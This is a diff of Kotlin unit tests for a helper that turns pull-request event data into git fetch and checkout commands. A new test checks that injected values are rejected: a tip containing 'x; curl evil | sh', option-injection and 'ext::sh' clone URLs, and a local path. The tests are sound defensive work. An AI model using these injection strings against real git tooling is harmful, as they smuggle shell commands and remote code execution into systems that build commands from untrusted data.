@@ -33,15 +33,30 @@ class GitCheckoutCommandsTest {
 
     @Test
     fun fetchQuotesWhatTheShellWouldRead() {
-        val commands = GitCheckoutCommands.gitFetchAndCheckout("https://relay.ngit.dev/npub1x/repo.git", "abc123", "pr/fix(0123abcd)")
+        val tip = "abc123".padEnd(40, '0')
+        val commands = GitCheckoutCommands.gitFetchAndCheckout("https://relay.ngit.dev/npub1x/repo.git", tip, "pr/fix(0123abcd)")
         assertEquals(
             listOf(
-                "git fetch https://relay.ngit.dev/npub1x/repo.git abc123",
+                "git fetch -- https://relay.ngit.dev/npub1x/repo.git $tip",
                 "git checkout -b 'pr/fix(0123abcd)' FETCH_HEAD",
             ),
             commands,
         )
-        assertNull(GitCheckoutCommands.gitFetchAndCheckout(null, "abc", "b"))
+        assertNull(GitCheckoutCommands.gitFetchAndCheckout(null, tip, "b"))
+    }
+
+    @Test
+    fun eventDataNeverBecomesShellCode() {
+        val url = "https://git.example/r.git"
+        // A tip from the PR's `c` tag that is not a commit id is never shown.
+        assertNull(GitCheckoutCommands.gitFetchAndCheckout(url, "x; curl evil | sh", "b"))
+        assertNull(GitCheckoutCommands.gitFetchAndCheckout(url, "abc123", "b"))
+        // A clone URL git would read as an option, a local path or another protocol is never shown.
+        val tip = "a".repeat(40)
+        assertNull(GitCheckoutCommands.gitFetchAndCheckout("--upload-pack=touch /tmp/x", tip, "b"))
+        assertNull(GitCheckoutCommands.gitFetchAndCheckout("/etc", tip, "b"))
+        assertNull(GitCheckoutCommands.gitFetchAndCheckout("ext::sh -c touch% /tmp/x", tip, "b"))
+        assertEquals(2, GitCheckoutCommands.gitFetchAndCheckout("git@github.com:a/b.git", tip, "b")?.size)
         assertEquals("'it'\\''s'", GitCheckoutCommands.shellQuote("it's"))
     }
 
